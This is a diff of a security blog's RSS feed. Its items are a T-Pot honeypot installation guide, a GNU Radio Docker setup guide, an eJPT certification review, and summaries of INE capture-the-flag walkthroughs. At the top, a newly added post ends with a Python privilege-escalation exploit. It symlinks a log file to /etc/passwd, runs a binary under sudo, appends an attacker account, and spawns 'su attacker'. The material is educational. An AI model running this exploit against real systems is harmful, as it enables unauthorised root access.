+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(T, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(P)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(L):
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>remove(L)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>symlink(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, L)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;sudo&#34;</span>, B, <span style="color:#e6db74">&#34;record&#34;</span>], timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">40</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(L, <span style="color:#e6db74">&#34;a&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(P)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        pty<span style="color:#f92672">.</span>spawn([<span style="color:#e6db74">&#34;su&#34;</span>, <span style="color:#e6db74">&#34;attacker&#34;</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> vulnerable():
+</span></span><span style="display:flex;"><span>        exploit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>How to Deploy T-Pot Honeypot on Linux for Threat Intelligence and Network Monitoring</title>
@@ -15,18 +316,19 @@
             <pubDate>Thu, 17 Jul 2025 11:27:17 +0100</pubDate>
             
             <guid>/posts/tpot/</guid>
-            <description>&lt;p&gt;In this guide, we’ll walk through the complete installation process of &lt;a href=&#34;https://github.com/telekom-security/tpotce/&#34;&gt;T-Pot&lt;/a&gt;, the open-source honeypot platform maintained by &lt;a href=&#34;https://geschaeftskunden.telekom.de/business/loesungen/digitalisierung/cyber-security&#34;&gt;Deutsche Telekom Security&lt;/a&gt;. T-Pot brings together several honeypot daemons, loggers, dashboards, and analysis tools into a single system, all containerized with Docker for easy deployment.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;This article is not just a copy-paste tutorial. It documents a real-world setup using Rocky Linux 9.6, including firewall configuration, troubleshooting tips, and post-installation monitoring. All screenshots, commands, and insights are based on an actual installation.&lt;/p&gt;</description>
+            <description>In this guide, we’ll walk through the complete installation process of T-Pot, the open-source honeypot platform maintained by Deutsche Telekom Security. T-Pot brings together several honeypot daemons, loggers, dashboards, and analysis tools into a single system, all containerized with Docker for easy deployment.
+This article is not just a copy-paste tutorial. It documents a real-world setup using Rocky Linux 9.6, including firewall configuration, troubleshooting tips, and post-installation monitoring. All screenshots, commands, and insights are based on an actual installation.</description>
             <content type="html"><![CDATA[<p>In this guide, we’ll walk through the complete installation process of <a href="https://github.com/telekom-security/tpotce/">T-Pot</a>, the open-source honeypot platform maintained by <a href="https://geschaeftskunden.telekom.de/business/loesungen/digitalisierung/cyber-security">Deutsche Telekom Security</a>. T-Pot brings together several honeypot daemons, loggers, dashboards, and analysis tools into a single system, all containerized with Docker for easy deployment.</p>
 <blockquote>
-<p>This article is not just a copy-paste tutorial. It documents a real-world setup using Rocky Linux 9.6, including firewall configuration, troubleshooting tips, and post-installation monitoring. All screenshots, commands, and insights are based on an actual installation.</p></blockquote>
+<p>This article is not just a copy-paste tutorial. It documents a real-world setup using Rocky Linux 9.6, including firewall configuration, troubleshooting tips, and post-installation monitoring. All screenshots, commands, and insights are based on an actual installation.</p>
+</blockquote>
 <h2 id="what-is-t-pot-">What is T-Pot ?</h2>
 <p>T‑Pot is an open‑source multi‑honeypot platform. It is designed to run multiple isolated honeypot services within Docker containers and to centralize all telemetry via a unified logging and analysis pipeline.</p>
 <p>T‑Pot integrates approximately 20 honeypot daemons such as <a href="https://github.com/cowrie/cowrie">Cowrie</a>, <a href="https://github.com/DinoTools/dionaea">Dionaea</a>, <a href="https://github.com/mushorg/glastopf">Glastopf</a>, <a href="https://github.com/johnnykv/Heralding">Heralding</a>, <a href="https://github.com/bontchev/elasticpot">ElasticPot</a>, <a href="https://github.com/phin3has/mailoney">Mailoney</a> and more in one consolidated system. Each honeypot runs in its own Docker container for modularity and isolation. This architecture enables flexible scaling and maintenance.</p>
 <p>The platform includes a full Elastic Stack (<a href="https://www.elastic.co/elasticsearch">Elasticsearch</a>, <a href="https://www.elastic.co/logstash">Logstash</a>, <a href="https://www.elastic.co/kibana">Kibana</a>) for ingestion, storage, and visualization of captured attacks and logs.</p>
 <blockquote>
-<p>For full details on supported honeypots, installation options, configuration, and advanced setups, check out the official GitHub repository: <a href="https://github.com/telekom-security/tpotce/">telekom-security/tpotce</a>.</p></blockquote>
+<p>For full details on supported honeypots, installation options, configuration, and advanced setups, check out the official GitHub repository: <a href="https://github.com/telekom-security/tpotce/">telekom-security/tpotce</a>.</p>
+</blockquote>
 <h2 id="pre-installation">Pre-Installation</h2>
 <h3 id="choosing-the-distribution">Choosing the Distribution</h3>
 <p>Before starting the installation, you must choose one of the Linux distributions supported by T-Pot:</p>
@@ -53,7 +355,8 @@
 <p>During installation, select the minimal (or server) installation type, never install a graphical environment, and make sure to install SSH.
 For this guide, the selected distribution is Rocky Linux OS 9.6 Boot ISO.</p>
 <blockquote>
-<p>learn more and get direct download links <a href="https://github.com/telekom-security/tpotce/?tab=readme-ov-file#choose-your-distro">here</a></p></blockquote>
+<p>learn more and get direct download links <a href="https://github.com/telekom-security/tpotce/?tab=readme-ov-file#choose-your-distro">here</a></p>
+</blockquote>
 <h3 id="system-requirements">System Requirements</h3>
 <ul>
 <li>RAM: <strong>16 GB</strong></li>
@@ -64,125 +367,125 @@ For this guide, the selected distribution is Rocky Linux OS 9.6 Boot ISO.</p>
 <p>Since the machine is placed upstream of the network firewall, it is recommended to configure the system firewall manually, even though the T-Pot installer sets it up for us.
 The port allocation is as follows:</p>
 <table>
-  <thead>
-      <tr>
-          <th style="text-align: left">Port</th>
-          <th style="text-align: left">Protocol</th>
-          <th style="text-align: left">Description</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td style="text-align: left">80, 443</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">T-Pot Management: Install, Updates, Logs (i.e. OS, GitHub, DockerHub, Sicherheitstacho, etc.</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">11434</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">LLM based honeypots: Access your Ollama installation</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">64294</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">T-Pot Management: Sensor data transmission to hive (through NGINX reverse proxy) to 127.0.0.1:64305</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">64295</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">T-Pot Management: Access to SSH</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">64297</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">T-Pot Management Access to NGINX reverse proxy</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">5555</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: ADBHoney</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">22</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Beelzebub (LLM required)</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">5000</td>
-          <td style="text-align: left">udp</td>
-          <td style="text-align: left">Honeypot: CiscoASA</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">8443</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: CiscoASA</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">443</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: CitrixHoneypot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">80, 102, 502, 1025, 2404, 10001, 44818, 47808, 50100</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Conpot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">161, 623</td>
-          <td style="text-align: left">udp</td>
-          <td style="text-align: left">Honeypot: Conpot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">22, 23</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Cowrie</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">19, 53, 123, 1900</td>
-          <td style="text-align: left">udp</td>
-          <td style="text-align: left">Honeypot: Ddospot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">11112</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Dicompot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">21, 42, 135, 443, 445, 1433, 1723, 1883, 3306, 8081</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Dionaea</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">69</td>
-          <td style="text-align: left">udp</td>
-          <td style="text-align: left">Honeypot: Dionaea</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">9200</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Elasticpot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">22</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Endlessh</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">80, 443, 8080, 8443</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Galah (LLM required)</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">8080</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: Go-pot</td>
-      </tr>
-      <tr>
-          <td style="text-align: left">80, 443</td>
-          <td style="text-align: left">tcp</td>
-          <td style="text-align: left">Honeypot: H0neytr4p</td>
-      </tr>
-  </tbody>
+<thead>
+<tr>
+<th style="text-align:left">Port</th>
+<th style="text-align:left">Protocol</th>
+<th style="text-align:left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">80, 443</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">T-Pot Management: Install, Updates, Logs (i.e. OS, GitHub, DockerHub, Sicherheitstacho, etc.</td>
+</tr>
+<tr>
+<td style="text-align:left">11434</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">LLM based honeypots: Access your Ollama installation</td>
+</tr>
+<tr>
+<td style="text-align:left">64294</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">T-Pot Management: Sensor data transmission to hive (through NGINX reverse proxy) to 127.0.0.1:64305</td>
+</tr>
+<tr>
+<td style="text-align:left">64295</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">T-Pot Management: Access to SSH</td>
+</tr>
+<tr>
+<td style="text-align:left">64297</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">T-Pot Management Access to NGINX reverse proxy</td>
+</tr>
+<tr>
+<td style="text-align:left">5555</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: ADBHoney</td>
+</tr>
+<tr>
+<td style="text-align:left">22</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Beelzebub (LLM required)</td>
+</tr>
+<tr>
+<td style="text-align:left">5000</td>
+<td style="text-align:left">udp</td>
+<td style="text-align:left">Honeypot: CiscoASA</td>
+</tr>
+<tr>
+<td style="text-align:left">8443</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: CiscoASA</td>
+</tr>
+<tr>
+<td style="text-align:left">443</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: CitrixHoneypot</td>
+</tr>
+<tr>
+<td style="text-align:left">80, 102, 502, 1025, 2404, 10001, 44818, 47808, 50100</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Conpot</td>
+</tr>
+<tr>
+<td style="text-align:left">161, 623</td>
+<td style="text-align:left">udp</td>
+<td style="text-align:left">Honeypot: Conpot</td>
+</tr>
+<tr>
+<td style="text-align:left">22, 23</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Cowrie</td>
+</tr>
+<tr>
+<td style="text-align:left">19, 53, 123, 1900</td>
+<td style="text-align:left">udp</td>
+<td style="text-align:left">Honeypot: Ddospot</td>
+</tr>
+<tr>
+<td style="text-align:left">11112</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Dicompot</td>
+</tr>
+<tr>
+<td style="text-align:left">21, 42, 135, 443, 445, 1433, 1723, 1883, 3306, 8081</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Dionaea</td>
+</tr>
+<tr>
+<td style="text-align:left">69</td>
+<td style="text-align:left">udp</td>
+<td style="text-align:left">Honeypot: Dionaea</td>
+</tr>
+<tr>
+<td style="text-align:left">9200</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Elasticpot</td>
+</tr>
+<tr>
+<td style="text-align:left">22</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Endlessh</td>
+</tr>
+<tr>
+<td style="text-align:left">80, 443, 8080, 8443</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Galah (LLM required)</td>
+</tr>
+<tr>
+<td style="text-align:left">8080</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: Go-pot</td>
+</tr>
+<tr>
+<td style="text-align:left">80, 443</td>
+<td style="text-align:left">tcp</td>
+<td style="text-align:left">Honeypot: H0neytr4p</td>
+</tr>
+</tbody>
 </table>
 <p>Rocky Linux uses <a href="https://firewalld.org/">Firewalld</a>, which is configured as follows:</p>
 <h4 id="enable-and-start-firewalld">Enable and Start Firewalld</h4>
@@ -267,7 +570,8 @@ The port allocation is as follows:</p>
 </span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Please check the configuration. Use &#39;firewall-cmd --remove-port=PORT&#39; to remove unexpected entries.&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
 </span></span></code></pre></div><blockquote>
-<p>You can download the script from <a href="/tpot/firewall_script.sh">here</a>. Please make sure to read through the script before executing it.</p></blockquote>
+<p>You can download the script from <a href="/tpot/firewall_script.sh">here</a>. Please make sure to read through the script before executing it.</p>
+</blockquote>
 
     <img src="/tpot/firewall-2.png"  alt="using the firewall script"  class="center"  style="border-radius: 8px; width: 100%;"  />
 
@@ -387,11 +691,9 @@ Navigate to <code>about:config</code>, search for <code>webgl.disabled</code>, a
             <pubDate>Sun, 29 Jun 2025 14:06:00 +0100</pubDate>
             
             <guid>/posts/gnuradiodocker/</guid>
-            <description>&lt;p&gt;This guide was tested on a Linux machine (Debian 12 - Bookworm), proper, up to date system with administrative privileges for the installing user.
-The following instructions are also compatible with other Debian based distributions like Ubuntu.&lt;/p&gt;
-&lt;h2 id=&#34;installing-docker&#34;&gt;Installing Docker&lt;/h2&gt;
-&lt;p&gt;&lt;em&gt;Source : &lt;a href=&#34;https://docs.docker.com/engine/install/debian/&#34;&gt;https://docs.docker.com/engine/install/debian/&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker &lt;code&gt;apt&lt;/code&gt; repository. Afterward, you can install and update Docker from the repository.&lt;/p&gt;</description>
+            <description>This guide was tested on a Linux machine (Debian 12 - Bookworm), proper, up to date system with administrative privileges for the installing user. The following instructions are also compatible with other Debian based distributions like Ubuntu.
+Installing Docker Source : https://docs.docker.com/engine/install/debian/
+Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker apt repository. Afterward, you can install and update Docker from the repository.</description>
             <content type="html"><![CDATA[<p>This guide was tested on a Linux machine (Debian 12 - Bookworm), proper, up to date system with administrative privileges for the installing user.
 The following instructions are also compatible with other Debian based distributions like Ubuntu.</p>
 <h2 id="installing-docker">Installing Docker</h2>
@@ -502,7 +804,7 @@ All in all, the docker file should look something like this :</li>
 <li>To access the container : <code>docker exec -it gnuradio bash</code></li>
 </ol>
 <h2 id="installing-the-uhd-drivers">Installing the UHD drivers</h2>
-<p><em>source : <a href="https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_%28UHD_and_GNU_Radio%29_on_Linux">https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux</a></em></p>
+<p><em>source : <a href="https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux">https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux</a></em></p>
 <p><em>note : The password for the user gnuradio is <code>gnuradio</code></em></p>
 <p>Once inside the container, make sure to update the packages that are already installed :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> apt upgrade -y
@@ -551,7 +853,7 @@ All in all, the docker file should look something like this :</li>
             <pubDate>Thu, 12 Jun 2025 13:43:05 +0100</pubDate>
             
             <guid>/posts/ejpt_cert/</guid>
-            <description>&lt;p&gt;During the last five months, I have been studying for the &lt;a href=&#34;https://certs.ine.com/cda4537e-dd0d-42d7-84a1-2af72436e6a0&#34;&gt;eJPT certification&lt;/a&gt; exam and i would like to share my experience with both the course and the certification process. I definitely had some conflicting thoughts about this experience and i would like for this post to be both a way for the reader to make a decision about purchasing the voucher and for me to spell my thoughts about my experience.&lt;/p&gt;</description>
+            <description>During the last five months, I have been studying for the eJPT certification exam and i would like to share my experience with both the course and the certification process. I definitely had some conflicting thoughts about this experience and i would like for this post to be both a way for the reader to make a decision about purchasing the voucher and for me to spell my thoughts about my experience.</description>
             <content type="html"><![CDATA[<p>During the last five months, I have been studying for the <a href="https://certs.ine.com/cda4537e-dd0d-42d7-84a1-2af72436e6a0">eJPT certification</a> exam and i would like to share my experience with both the course and the certification process. I definitely had some conflicting thoughts about this experience and i would like for this post to be both a way for the reader to make a decision about purchasing the voucher and for me to spell my thoughts about my experience.</p>
 <h2 id="what-is-ejpt">What is eJPT</h2>
 <p>The Junior Penetration Tester certification by <a href="https://my.ine.com/">INE</a> is designed for individuals with basic understands of Internet technologies and networking but want to step into the security - Red Teaming - world. It covers 4 main segments :</p>
@@ -573,7 +875,8 @@ All in all, the docker file should look something like this :</li>
 <h3 id="my-experience-with-the-course">My experience with the course</h3>
 <p>This was honestly the biggest letdown for me personally (though it doesn&rsquo;t have to be for you too).</p>
 <blockquote>
-<p>The INE Fundamentals subscription offers the Penetration Testing Student Learning Path], built for entry-level Red Team professionals with a basic understanding of cybersecurity fundamentals. It prepares you to take the eJPT exam through a blend of expert-led courses and practical lab time. When you’ve completed the learning path, you’re ready for the exam!</p></blockquote>
+<p>The INE Fundamentals subscription offers the Penetration Testing Student Learning Path], built for entry-level Red Team professionals with a basic understanding of cybersecurity fundamentals. It prepares you to take the eJPT exam through a blend of expert-led courses and practical lab time. When you’ve completed the learning path, you’re ready for the exam!</p>
+</blockquote>
 <p>The above is the course description on INE&rsquo;s website and I should&rsquo;ve honestly done some more research into the content before diving in.</p>
 <p>I am a Networking and Telecommunications engineering student and through-out my studies I had a rooted interest on how internet technologies worked and, of course, how to break them. I honestly think that this path wasn&rsquo;t right for me and i could have easily completed the exam without it.</p>
 <p>At first, the labs were fun and the courses seemed interesting, but as time continued on, I started feeling that things got more and more repetitive and pointless. I was tired of using the same old (very old) exploits and how easy they got with time, it honestly started feeling like a chore rather than a fun learning opportunity.</p>
@@ -585,30 +888,30 @@ I am nearly certain that this would constitute a perfect beginner course for peo
 <p>I did learn a lot of things, I want to make that very clear, and I really appreciated the way the instructor <a href="https://alexisahmed.com/">Alexis Ahmed</a> explained the concepts and made them clear and easy to understand by anyone.</p>
 <p>So, should <em>you</em> consider buying the course? here&rsquo;s a table that could help you decide.</p>
 <table>
-  <thead>
-      <tr>
-          <th><strong>Pros</strong></th>
-          <th><strong>Cons</strong></th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><strong>Beginner-Friendly:</strong> Ideal for those new to Linux, networking, or cybersecurity.</td>
-          <td><strong>Repetitive Labs:</strong> Concepts and tools are recycled often without much depth.</td>
-      </tr>
-      <tr>
-          <td><strong>Clear Structure:</strong> Covers assessment, auditing, and exploitation in a logical flow.</td>
-          <td><strong>Outdated Exploits:</strong> Many labs rely on old vulnerabilities not seen in modern environments.</td>
-      </tr>
-      <tr>
-          <td><strong>Hands-On Focus:</strong> The labs and exam emphasize real tool usage over theory.</td>
-          <td><strong>Video Course Issues:</strong> Poor pacing, lots of repetition, and not well-structured for advanced learners.</td>
-      </tr>
-      <tr>
-          <td><strong>Instructor:</strong> Explains topics clearly and makes them approachable.</td>
-          <td><strong>Course May Be Skippable:</strong> If you already have hands-on experience, it might feel like a waste of time.</td>
-      </tr>
-  </tbody>
+<thead>
+<tr>
+<th><strong>Pros</strong></th>
+<th><strong>Cons</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Beginner-Friendly:</strong> Ideal for those new to Linux, networking, or cybersecurity.</td>
+<td><strong>Repetitive Labs:</strong> Concepts and tools are recycled often without much depth.</td>
+</tr>
+<tr>
+<td><strong>Clear Structure:</strong> Covers assessment, auditing, and exploitation in a logical flow.</td>
+<td><strong>Outdated Exploits:</strong> Many labs rely on old vulnerabilities not seen in modern environments.</td>
+</tr>
+<tr>
+<td><strong>Hands-On Focus:</strong> The labs and exam emphasize real tool usage over theory.</td>
+<td><strong>Video Course Issues:</strong> Poor pacing, lots of repetition, and not well-structured for advanced learners.</td>
+</tr>
+<tr>
+<td><strong>Instructor:</strong> Explains topics clearly and makes them approachable.</td>
+<td><strong>Course May Be Skippable:</strong> If you already have hands-on experience, it might feel like a waste of time.</td>
+</tr>
+</tbody>
 </table>
 <h3 id="my-experience-during-the-exam">My experience during the exam</h3>
 <p>As i mentioned before, I had 48 hours to complete the exam, I wasn&rsquo;t planning on taking that much time and I ended up finishing way earlier but I appreciate the fact that they thought about the  people that might have to work around their school or work schedules. I finished in about 16 hours with a full night of sleep ans chores in the middle even with all the problems that I encountered (and summoned upon myself).</p>
@@ -635,15 +938,8 @@ If, in the other hand you have some experience, i would recommend you save some 
             <pubDate>Sat, 10 May 2025 12:57:52 +0100</pubDate>
             
             <guid>/posts/ine_ctf_5/</guid>
-            <description>&lt;p&gt;Second CTF in the longest module for the &lt;em&gt;Penetration testing student&lt;/em&gt; course, This time we have two machines; &lt;strong&gt;target1.ine.local&lt;/strong&gt; &amp;amp; &lt;strong&gt;target2.ine.local&lt;/strong&gt;. Let&amp;rsquo;s see what flags we need to capture :&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Flag 1:&lt;/strong&gt; Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 2:&lt;/strong&gt; The files on the RSYNC server hold valuable information. Explore the contents to find the flag.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 3:&lt;/strong&gt; Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 4:&lt;/strong&gt; Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;So it seems that the first machine hosts an &lt;a href=&#34;https://en.wikipedia.org/wiki/Rsync&#34;&gt;&lt;em&gt;rsync&lt;/em&gt;&lt;/a&gt; file server; therefore it is most likely a Linux machine.
-The 4th flag mentions automations, which makes me think of &lt;a href=&#34;https://en.wikipedia.org/wiki/Cron&#34;&gt;&lt;em&gt;cron&lt;/em&gt;&lt;/a&gt; so it might also ne a Linux machine.&lt;/p&gt;</description>
+            <description>Second CTF in the longest module for the Penetration testing student course, This time we have two machines; target1.ine.local &amp;amp; target2.ine.local. Let&amp;rsquo;s see what flags we need to capture :
+Flag 1: Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting. Flag 2: The files on the RSYNC server hold valuable information. Explore the contents to find the flag. Flag 3: Try exploiting the webapp to gain a shell using Metasploit on target2.</description>
             <content type="html"><![CDATA[<p>Second CTF in the longest module for the <em>Penetration testing student</em> course, This time we have two machines; <strong>target1.ine.local</strong> &amp; <strong>target2.ine.local</strong>. Let&rsquo;s see what flags we need to capture :</p>
 <ul>
 <li><strong>Flag 1:</strong> Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.</li>
@@ -744,8 +1040,8 @@ After navigating to the /etc/cron.d directory, we find two jobs and one of them 
             <pubDate>Wed, 07 May 2025 16:04:40 +0100</pubDate>
             
             <guid>/posts/ine_ctf_4/</guid>
-            <description>&lt;p&gt;It has been a while since I went back to my ejpt course because I felt it becoming a little repetitive, but lately I had some free time and decided to tackle it again. And today, I am going to do a walkthrough for the &lt;em&gt;&lt;strong&gt;Host &amp;amp; Network Penetration Testing: The Metasploit Framework CTF 1&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
-&lt;p&gt;This time we are provided with a windows machine (since we&amp;rsquo;re told to exploit an MSSQL server) and we have 4 flags to capture :&lt;/p&gt;</description>
+            <description>It has been a while since I went back to my ejpt course because I felt it becoming a little repetitive, but lately I had some free time and decided to tackle it again. And today, I am going to do a walkthrough for the Host &amp;amp; Network Penetration Testing: The Metasploit Framework CTF 1.
+This time we are provided with a windows machine (since we&amp;rsquo;re told to exploit an MSSQL server) and we have 4 flags to capture :</description>
             <content type="html"><![CDATA[<p>It has been a while since I went back to my ejpt course because I felt it becoming a little repetitive, but lately I had some free time and decided to tackle it again. And today, I am going to do a walkthrough for the <em><strong>Host &amp; Network Penetration Testing: The Metasploit Framework CTF 1</strong></em>.</p>
 <p>This time we are provided with a windows machine (since we&rsquo;re told to exploit an MSSQL server) and we have 4 flags to capture :</p>
 <ul>
@@ -940,15 +1236,9 @@ After navigating to the /etc/cron.d directory, we find two jobs and one of them 
             <pubDate>Sun, 06 Apr 2025 17:15:27 +0100</pubDate>
             
             <guid>/posts/ine_ctf_3/</guid>
-            <description>&lt;p&gt;Continuing on with my eJPT certification, this time we&amp;rsquo;ll tackle the second CTF in the  &lt;em&gt;System-Host Based Attacks&lt;/em&gt; course.&lt;/p&gt;
-&lt;p&gt;In this lab we&amp;rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Flag 1&lt;/strong&gt;: Check the root (&amp;rsquo;/&amp;rsquo;) directory for a file that might hold the key to the first flag on target1.ine.local.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 2&lt;/strong&gt;: In the server&amp;rsquo;s root directory, there might be something hidden. Explore &amp;lsquo;/opt/apache/htdocs/&amp;rsquo; carefully to find the next flag on target1.ine.local.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 3&lt;/strong&gt;: Investigate the user&amp;rsquo;s home directory and consider using &amp;rsquo;libssh_auth_bypass&amp;rsquo; to uncover the flag on target2.ine.local.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Flag 4&lt;/strong&gt;: The most restricted areas often hold the most valuable secrets. Look into the &amp;lsquo;/root&amp;rsquo; directory to find the hidden flag on target2.ine.local.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;These would mostly be linux machines (since we&amp;rsquo;re in the linux section of the course), so let&amp;rsquo;s start by tackling both the first and second flag at the same time.&lt;/p&gt;</description>
